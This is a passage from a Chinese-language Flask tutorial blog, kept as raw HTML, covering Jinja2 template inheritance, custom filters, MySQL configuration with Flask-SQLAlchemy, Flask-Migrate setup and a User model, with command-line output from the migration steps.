Myblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123; user.username &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>（2）</span><br><span class="line">    &#123;% for post in posts %&#125;（1）</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; user.username &#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; user.body &#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;（3）</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那怎么引入呢？答：render_template（），就像下面一样，刚刚说到可以传递参数进去动态渲染，user=user就是传递参数的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    user = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;zyen&quot;</span>, <span class="string">&quot;body&quot;</span>: <span class="string">&quot;want to be a best hacker!&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br></pre></td></tr></table></figure><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p>既然开始建立模板，就不得不得提模板继承，在博客中，总有一些页面元素是一成不变的，为了解耦，我们来创建一个父模板，让剩下需要父模板中的内容的子模板继承就好了，创建一个base.html，键入下面的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        &#123;% if title %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125; - Myblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Myblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Microblog:</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;.index&#x27;) &#125;&#125;&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        &#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一个block就是可以重写的部分，剩下的内容都会继承：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>那么我们的index.html就可以通过extends来继承base.html，再在block中加上需要重写的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">   &lt;h1&gt;Hi, &#123;&#123; user.username &#125;&#125;!&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;&lt;p&gt;&#123;&#123; user.username &#125;&#125; says: &lt;b&gt;&#123;&#123; user.body &#125;&#125;&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>重新启动服务器可看到，模板已经正常工作！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/6.jpg" class=""><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>过滤器顾名思义就说过滤某种东西的，在Flask的世界里，我们可以通过<code>&#123;&#123; （value）| （filter） &#125;&#125;</code>的形式来使用过滤器，filter可以理解成一个内置的函数，就比如平常在计算某个字符串的长度的时候都会去调用length（value）来计算长度，但在模板当中却是用<code>&#123;&#123;（value）| length &#125;&#125;</code>，所以本质上还是差不多的，下面列举一些常见的过滤器，提醒一下过滤器是可以进行嵌套的<code>&#123;&#123; （value）| （filter_1）（filter_2）（filter_3）... &#125;&#125;</code>，执行的顺序就是从左到右</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把大写字母转换成小写</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;HELLO&#x27;</span> | lower&#125;&#125;</span><br><span class="line"><span class="comment"># 把小写转换成大写</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;hello&#x27;</span>| upper &#125;&#125;</span><br><span class="line"><span class="comment"># 字符串反转</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;hack&#x27;</span> | reverse&#125;&#125;</span><br><span class="line"><span class="comment"># 首字母大写，其余字母小写</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;zyen&#x27;</span> | capitalize &#125;&#125;</span><br><span class="line"><span class="comment"># 过滤html标签 em标签是斜体</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;&lt;em&gt;hellp&lt;/em&gt;&#x27;</span> | striptags&#125;&#125;</span><br><span class="line"><span class="comment"># 只显list首个元素</span></span><br><span class="line">&#123;&#123; [<span class="number">100</span>,<span class="number">90</span>,<span class="number">86</span>] | first &#125;&#125;</span><br><span class="line"><span class="comment"># 只显list最后一个元素</span></span><br><span class="line">&#123;&#123; [<span class="number">100</span>,<span class="number">90</span>,<span class="number">86</span>] | last &#125;&#125;</span><br><span class="line"><span class="comment"># 显示一个list的长度</span></span><br><span class="line">&#123;&#123; [<span class="number">1</span>,<span class="number">2</span>] | length &#125;&#125;</span><br><span class="line"><span class="comment"># 对list所有元素求和</span></span><br><span class="line">&#123;&#123; [<span class="number">100</span>,<span class="number">200</span>] | <span class="built_in">sum</span> &#125;&#125;</span><br><span class="line"><span class="comment"># 对于list进行排序</span></span><br><span class="line">&#123;&#123; [<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>] | sort&#125;&#125;</span><br><span class="line"><span class="comment"># 链调用过滤器,按顺序执行</span></span><br><span class="line">&#123;&#123; <span class="string">&#x27;abc&#x27;</span> | reverse | upper &#125;&#125;</span><br></pre></td></tr></table></figure><p>那既然过滤器相当于python中的内置函数，所以过滤器也是可以自定义过滤器的，自定义过滤器的方法有两种：</p><ul><li>通过装饰器来添加</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;replace_strings&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace_hello</span>(<span class="params">value</span>):</span></span><br><span class="line">    value_tmp = value.replace(<span class="string">&#x27;best boy&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> value_tmp</span><br></pre></td></tr></table></figure><ul><li>通过app的方法来替换内置的方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace_hello</span>(<span class="params">value</span>):</span></span><br><span class="line">    value_tmp = value.replace(<span class="string">&#x27;best boy&#x27;</span>, <span class="string">&#x27;hacker&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> value_tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># add_template_filter的参数一是调用的视图函数，参数二是替换的内置方法</span></span><br><span class="line">app.add_template_filter(replace_hello, <span class="string">&quot;replace&quot;</span>)</span><br></pre></td></tr></table></figure><p>在模板中调用刚刚定义好的视图函数：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi,&#123;&#123; user.username &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;# 传递user = &#123;&quot;username&quot;: &quot;zyen&quot;, &quot;post&quot;: &quot;i am best boy&quot;&#125;进来渲染 #&#125;</span><br><span class="line">&#123;&#123; user.username &#125;&#125; say: &#123;&#123; user.post | replace &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>执行后看到i am best boy被替换成i am hacker，其实自定义过滤器的用法就在于此，当某个用户可控的输入中，我们需要进行更加细致的过滤的时候，可以通过自定义一个正则过滤的过滤器来对用户的输入进行过滤！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/7.png" class=""><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>终于来到模型，我们的网站不可能每次启动都需要重新输入数据才能使用，总得将数据持久化，所有这节来讲讲数据库！Flask并没有内置数据库，目的也是为了轻量级的考虑，所以它得引用外部的数据库扩展，可选的数据库有MySQL，PostgreSQL和SQLite，这里我使用的是MySQL，SQLite参考下面的文章：</p><p><a href="https://github.com/luhuisicnu/The-Flask-Mega-Tutorial-zh/blob/master/docs/%e7%ac%ac%e5%9b%9b%e7%ab%a0%ef%bc%9a%e6%95%b0%e6%8d%ae%e5%ba%93.md">SQLite配置指南</a></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>使用MySQL之前需要添加一些配置才能愉快的使用数据库，首先需要打通python和数据库的联系，这里用的是MySQL，所以pymysql首当其冲，接下来是Flask和python的联系，就得用到Flask的核心插件Flask-SQLAlchemy，这个插件封装了一个很有用的功能就是ORM（Object Relational Mapping，对象关系映射），用简单的话说就是可以用类，对象来表示数据库中的一张表，现在不理解没关系，等下就会明白它的含义！最后的最后是一个管理工具—-Flask-Migrate，是SQLAlchemy的一个数据库迁移框架，它可以通过命令行很方便的去操作数据库，它们的关系如下：</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/9.png" class="" width="9"><p>在根目录创建config.py写入一系列的配置，为了调用方便，定义一个Config类，这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&quot;mysql+pymysql://root:(数据库密码)@127.0.0.1/（数据库名）&quot;</span></span><br><span class="line">    SQLALCHEMY_TRACT_MODIFICATIONS = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 启动调试模式</span></span><br><span class="line">    ENV = <span class="string">&quot;development&quot;</span></span><br><span class="line">    DEBUG = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>在<code>app/__init__.py</code>中添加下面的代码生效配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">app.config.from_object(Config)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由于版本问题导致会有一些奇奇怪怪的报错，下面列举一些我测试可用的版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">alembic==<span class="number">1.4</span><span class="number">.2</span></span><br><span class="line">click==<span class="number">7.1</span><span class="number">.2</span></span><br><span class="line">colorama==<span class="number">0.4</span><span class="number">.4</span></span><br><span class="line">Flask==<span class="number">1.1</span><span class="number">.2</span></span><br><span class="line">Flask-Migrate==<span class="number">2.5</span><span class="number">.3</span></span><br><span class="line">Flask-SQLAlchemy==<span class="number">2.4</span><span class="number">.1</span></span><br><span class="line">greenlet==<span class="number">1.1</span><span class="number">.2</span></span><br><span class="line">itsdangerous==<span class="number">1.1</span><span class="number">.0</span></span><br><span class="line">Jinja2==<span class="number">2.11</span><span class="number">.2</span></span><br><span class="line">Mako==<span class="number">1.1</span><span class="number">.2</span></span><br><span class="line">MarkupSafe==<span class="number">1.1</span><span class="number">.1</span></span><br><span class="line">PyMySQL==<span class="number">1.0</span><span class="number">.2</span></span><br><span class="line">python-dateutil==<span class="number">2.8</span><span class="number">.2</span></span><br><span class="line">python-editor==<span class="number">1.0</span><span class="number">.4</span></span><br><span class="line">six==<span class="number">1.14</span><span class="number">.0</span></span><br><span class="line">SQLAlchemy==<span class="number">1.3</span><span class="number">.17</span></span><br><span class="line">Werkzeug==<span class="number">1.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>保存到名为requirements.txt中并放到项目下，在虚拟环境命令行中输入下面的命令进行安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>在<code>app/__init__.py</code>添加下面的配置，需要注意的是此版本下的Migrate需要配合Manager命令行管理工具才能正常使用，高版本不需要这一步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate, MigrateCommand</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">manager = Manager(app=app)</span><br><span class="line">migrate = Migrate(app=app, db=db)</span><br><span class="line">manager.add_command(<span class="string">&#x27;db&#x27;</span>, MigrateCommand)</span><br></pre></td></tr></table></figure><p>最后在app.py修改启动方式为manager</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><p>在虚拟环境的命令行中用运行app.py，出现下面配置则配置完成！可以看到命令行参数中有个db的选项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zyen\PycharmProjects\myblog&gt;python app.py</span><br><span class="line">C:\Users\zyen\PycharmProjects\myblog\venv\lib\site-packages\flask_sqlalchemy\__init__.py:<span class="number">834</span>: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead <span class="keyword">and</span> will b</span><br><span class="line">e disabled by default <span class="keyword">in</span> the future.  <span class="type">Set</span> it to <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span> to suppress this warning.</span><br><span class="line">  warnings.warn(FSADeprecationWarning(</span><br><span class="line">usage: app.py [-?] &#123;db,shell,runserver&#125; ...</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;db,shell,runserver&#125;</span><br><span class="line">    db                  Perform database migrations</span><br><span class="line">    shell               Runs a Python shell inside Flask application context.</span><br><span class="line">    runserver           Runs the Flask development server i.e. app.run()</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -?, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br></pre></td></tr></table></figure><p>在后面添加db，可以看到很多参数，这些参数就是Flask-Migrate用来操作数据库的命令，常用的为init，migrate，upgrade</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zyen\PycharmProjects\myblog&gt;python app.py db</span><br><span class="line">C:\Users\zyen\PycharmProjects\myblog\venv\lib\site-packages\flask_sqlalchemy\__init__.py:<span class="number">834</span>: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead <span class="keyword">and</span> will b</span><br><span class="line">e disabled by default <span class="keyword">in</span> the future.  <span class="type">Set</span> it to <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span> to suppress this warning.</span><br><span class="line">  warnings.warn(FSADeprecationWarning(</span><br><span class="line">usage: Perform database migrations</span><br><span class="line"></span><br><span class="line">Perform database migrations</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;init,revision,migrate,edit,merge,upgrade,downgrade,show,history,heads,branches,current,stamp&#125;</span><br><span class="line">    init                Creates a new migration repository</span><br><span class="line">    revision            Create a new revision file.</span><br><span class="line">    migrate             Alias <span class="keyword">for</span> <span class="string">&#x27;revision --autogenerate&#x27;</span></span><br><span class="line">    edit                Edit current revision.</span><br><span class="line">    merge               Merge two revisions together. Creates a new migration file</span><br><span class="line">    upgrade             Upgrade to a later version</span><br><span class="line">    downgrade           Revert to a previous version</span><br><span class="line">    show                Show the revision denoted by the given symbol.</span><br><span class="line">    history             <span class="type">List</span> changeset scripts <span class="keyword">in</span> chronological order.</span><br><span class="line">    heads               Show current available heads <span class="keyword">in</span> the script directory</span><br><span class="line">    branches            Show current branch points</span><br><span class="line">    current             Display the current revision <span class="keyword">for</span> each database.</span><br><span class="line">    stamp               <span class="string">&#x27;stamp&#x27;</span> the revision table <span class="keyword">with</span> the given revision; don<span class="string">&#x27;t run any migrations</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -?, --help            show this help message and exit</span></span><br></pre></td></tr></table></figure><h3 id="创建User表"><a href="#创建User表" class="headerlink" title="创建User表"></a>创建User表</h3><p>刚刚讲到可以用类，对象来代替表的定义，接下来定义一个User类，在app包下创建models.py专门存放数据库表，User类继承db.Model，让它拥有db.Model的方法，如定义列和类型，查询数据库内容等，db. Column指的是数据库中的一列，db. Integer/db. String等一些系列的用法都是在定义字段的类型，下面的链接列举了全部的字段和对应的解释：</p><p><a href="https://blog.51cto.com/u_13914991/2172809">SQLAlchemy配置说明，字段类型，约束条件</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), index=<span class="literal">True</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    email = db.Column(db.String(<span class="number">128</span>), index=<span class="literal">True</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    password_hash = db.Column(db.String(<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;User &#123;&#125;&gt;&quot;</span>.<span class="built_in">format</span>(self.username)</span><br></pre></td></tr></table></figure><p>定义好类之后就可以可以创建ORM映射，在命令行中使用init初始化数据库，执行完成之后可以看到它创建了一个目录migrations，里面有个需要注意的目录<strong>versions</strong>，里面存放的是目前所有创建过的映射！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zyen\PycharmProjects\myblog&gt;python app.py db init</span><br><span class="line">C:\Users\zyen\PycharmProjects\myblog\venv\lib\site-packages\flask_sqlalchemy\__init__.py:834: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will b</span><br><span class="line">e disabled by default in the future.  Set it to True or False to suppress this warning.</span><br><span class="line">  warnings.warn(FSADeprecationWarning(</span><br><span class="line">Creating directory C:\Users\zyen\PycharmProjects\myblog\migrations ...  done</span><br><span class="line">Creating directory C:\Users\zyen\PycharmProjects\myblog\migrations\versions ...  done</span><br><span class="line">Generating C:\Users\zyen\PycharmProjects\myblog\migrations\alembic.ini ...  done</span><br><span class="line">Generating C:\Users\zyen\PycharmProjects\myblog\migrations\env.py ...  done</span><br><span class="line">Generating C:\Users\zyen\PycharmProjects\myblog\migrations\README ...  done</span><br><span class="line">Generating C:\Users\zyen\PycharmProjects\myblog\migrations\script.py.mako ...  done</span><br><span class="line">Please edit configuration/connection/logging settings in &#x27;C:\\Users\\zyen\\PycharmProjects\\myblog\\migrations\\alembic.ini&#x27; before proceeding.</span><br></pre></td></tr></table></figure><p>接下来就创建ORM映射，可以看到在versions文件夹里面创建了一个d0b26b497fd8_.py的文件，这个其实就是本次映射所要执行的数据库命令，为什么说versions目录需要注意，就是这个原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zyen\PycharmProjects\myblog&gt;python app.py db migrate</span><br><span class="line">C:\Users\zyen\PycharmProjects\myblog\venv\lib\site-packages\flask_sqlalchemy\__init__.py:834: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will b</span><br><span class="line">e disabled by default in the future.  Set it to True or False to suppress this warning.</span><br><span class="line">  warnings.warn(FSADeprecationWarning(</span><br><span class="line">INFO  [alembic.runtime.migration] Context impl MySQLImpl.</span><br><span class="line">INFO  [alembic.runtime.migration] Will assume non-transactional DDL.</span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added table &#x27;user&#x27;</span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added index &#x27;ix_user_email&#x27; on &#x27;[&#x27;email&#x27;]&#x27;</span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added index &#x27;ix_user_username&#x27; on &#x27;[&#x27;username&#x27;]&#x27;</span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added table &#x27;post&#x27;</span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added index &#x27;ix_post_timeStep&#x27; on &#x27;[&#x27;timeStep&#x27;]&#x27;</span><br><span class="line">Generating C:\Users\zyen\PycharmProjects\myblog\migrations\versions\d0b26b497fd8_.py ...  done</span><br></pre></td></tr></table></figure><p>接下来通过upgrade来更新表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zyen\PycharmProjects\myblog&gt;python app.py db upgrade</span><br><span class="line">C:\Users\zyen\PycharmProjects\myblog\venv\lib\site-packages\flask_sqlalchemy\__init__.py:834: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will b</span><br><span class="line">e disabled by default in the future.  Set it to True or False to suppress this warning.</span><br><span class="line">  warnings.warn(FSADeprecationWarning(</span><br><span class="line">INFO  [alembic.runtime.migration] Context impl MySQLImpl.</span><br><span class="line">INFO  [alembic.runtime.migration] Will assume non-transactional DDL.</span><br><span class="line">INFO  [alembic.runtime.migration] Running upgrade  -&gt; d0b26b497fd8, empty message</span><br></pre></td></tr></table></figure><p>更新完之后，数据库已经存在User表了！！！至此Flask的核心模块已经搭建完成！接下来就可以开始在Flask大展拳脚啦！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/10.png" class=""><h2 id="蓝图"><a 